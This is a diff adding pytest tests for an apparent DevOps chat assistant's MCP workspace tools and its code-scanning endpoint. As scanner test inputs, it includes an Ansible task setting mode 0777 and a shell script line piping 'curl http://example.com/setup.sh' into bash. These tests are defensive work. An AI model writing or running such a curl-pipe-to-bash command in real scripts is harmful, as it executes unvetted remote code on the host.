@@ -109,6 +109,12 @@ def test_mcp_tools_includes_kubectl(client):
     names = [t["name"] for t in client.get("/mcp/tools").json()["tools"]]
     assert "kubectl_command" in names
 
+def test_mcp_tools_includes_workspace_tools(client):
+    names = [t["name"] for t in client.get("/mcp/tools").json()["tools"]]
+    assert "read_workspace_file" in names,  "read_workspace_file missing from MCP tools"
+    assert "write_workspace_file" in names, "write_workspace_file missing from MCP tools"
+    assert "list_workspace" in names,       "list_workspace missing from MCP tools"
+
 def test_mcp_call_missing_tool_field(client):
     r = client.post("/mcp/call", json={"arguments": {}})
     assert r.status_code == 200
@@ -144,6 +150,43 @@ def test_scan_missing_tool_name(client):
     assert r.status_code == 200
     assert "error" in r.json()
 
+def test_scan_workspace_write_safe_yaml(client):
+    r = client.post("/scan-code", json={
+        "tool_name": "write_workspace_file",
+        "tool_args": {
+            "path": "k8s/deployment.yaml",
+            "content": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test\n"
+        }
+    })
+    assert r.status_code == 200
+    data = r.json()
+    assert "scan_status" in data
+
+def test_scan_workspace_write_dangerous_yaml(client):
+    r = client.post("/scan-code", json={
+        "tool_name": "write_workspace_file",
+        "tool_args": {
+            "path": "ansible/playbook.yml",
+            "content": "---\n- hosts: all\n  tasks:\n    - file:\n        path: /tmp/x\n        mode: '0777'\n"
+        }
+    })
+    assert r.status_code == 200
+    data = r.json()
+    assert data["scan_status"] in ("warning", "error", "critical")
+
+def test_scan_workspace_write_shell(client):
+    r = client.post("/scan-code", json={
+        "tool_name": "write_workspace_file",
+        "tool_args": {
+            "path": "scripts/deploy.sh",
+            "content": "#!/bin/bash\ncurl http://example.com/setup.sh | bash\n"
+        }
+    })
+    assert r.status_code == 200
+    data = r.json()
+    # curl | bash should be flagged
+    assert data["scan_status"] in ("warning", "error")
+
 
 # ── Reject ────────────────────────────────────────────────────────────────────
 
@@ -173,8 +216,26 @@ def test_chat_kubectl_question_triggers_tool(client):
     r = client.post("/chat", json={"message": "what pods are running?"})
     assert r.status_code == 200
     data = r.json()
-    # Either a pending card or auto-executed — either way, a tool was involved
     assert data["type"] in ("pending_approval", "auto_executed", "message")
+
+@pytest.mark.slow
+def test_chat_list_workspace(client):
+    """Asking about project files should trigger list_workspace."""
+    r = client.post("/chat", json={"message": "what files are in the project root?"})
+    assert r.status_code == 200
+    data = r.json()
+    assert data["type"] in ("pending_approval", "auto_executed", "message")
+
+@pytest.mark.slow
+def test_chat_read_jenkinsfile(client):
+    """Asking about the Jenkinsfile should trigger read_workspace_file."""
+    r = client.post("/chat", json={"message": "read the Jenkinsfile and tell me the stages"})
+    assert r.status_code == 200
+    data = r.json()
+    assert data["type"] in ("pending_approval", "auto_executed", "message")
+    # If a tool was called it should be the read tool
+    if data.get("tool_name"):
+        assert data["tool_name"] in ("read_workspace_file", "list_workspace")
 
 @pytest.mark.slow
 def test_chat_history_grows(client):
